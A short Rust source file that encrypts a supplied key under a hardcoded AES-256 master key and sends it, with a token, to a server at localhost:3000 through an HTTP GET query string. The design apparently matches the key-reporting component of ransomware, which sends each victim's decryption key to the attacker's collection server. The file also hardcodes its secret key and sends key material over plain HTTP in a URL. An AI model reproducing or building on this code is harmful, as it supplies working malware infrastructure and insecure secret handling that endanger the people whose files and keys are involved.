use ring::{aead::*, rand};

const KEY_BYTES: [u8; 32] = [190, 4, 130, 95, 129, 89, 39, 29,
                             80, 181, 156, 93, 58, 238, 87, 146, 
                             117, 228, 217, 201, 26, 76, 14, 60, 
                             145, 18, 113, 242, 79, 157, 132, 116];

fn encrypt_key(data: &mut Vec<u8>){    
    let rng = rand::SystemRandom::new();

    let iv: [u8; 16] = rand::generate(&rng).unwrap().expose();
    let mut iv = Vec::from(iv);
    iv.truncate(12);

    let key = LessSafeKey::new(UnboundKey::new(&AES_256_GCM, &KEY_BYTES).unwrap());
    let nonce = Nonce::assume_unique_for_key(iv.clone().try_into().expect("Error"));
    key.seal_in_place_append_tag(nonce, Aad::empty(), data).unwrap();
    data.extend(iv);
}

fn format_key(vec: &mut Vec<u8>) -> String{
    encrypt_key(vec);
    let key = format!("{:?}", vec);
    key.replace(&['[', ',', ']'], "")
}

pub fn stash_key(token: &str, key: &mut Vec<u8>) -> Result<(), Box<dyn std::error::Error>>{
    let url = format!("http://localhost:3000/get?token={}&key={}", token, format_key(key));
    reqwest::blocking::get(url)?;
    Ok(())
}
